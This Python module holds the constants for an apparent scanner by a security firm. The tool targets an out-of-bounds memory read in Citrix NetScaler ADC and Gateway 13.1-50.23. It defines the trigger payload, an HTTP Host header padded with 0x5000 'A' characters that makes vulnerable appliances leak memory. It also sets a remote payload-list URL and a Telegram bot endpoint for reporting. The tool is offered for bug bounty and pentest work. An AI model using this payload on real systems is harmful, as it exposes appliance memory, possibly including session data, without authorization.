#!/usr/bin/env python

"""
 * critix-netscaler-memory-leak
 * critix-netscaler-memory-leak Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */


"""


class Data:
    blog = 'https://blogs.cappriciosec.com/blog/167/critix-netscaler-memory-leak'
    api = 'https://api.cappriciosec.com/Telegram/cappriciosecbot.php'
    config_path = '~/.config/cappriciosec-tools/cappriciosec.yaml'
    payloadurl = 'https://raw.githubusercontent.com/Cappricio-Securities/PayloadAllTheThings/main/critix-netscaler-memory-leak.txt'
    bugname = 'Citrix Netscaler ADC & Gateway v13.1-50.23 - Out-Of-Bounds Memory Read'
    pay = "A" * 0x5000
    rheaders = {
        "Host": pay,
        "Tool-Name": "critix-netscaler-memory-leak",
        "Developed-by": "cappriciosec.com",
        "Contact-us": "contact@cappriciosec.com"
    }


class Colors:
    RED = '\x1b[31;1m'
    BLUE = '\x1b[34;1m'
    GREEN = '\x1b[32;1m'
    RESET = '\x1b[0m'
    MAGENTA = '\x1b[35;1m'
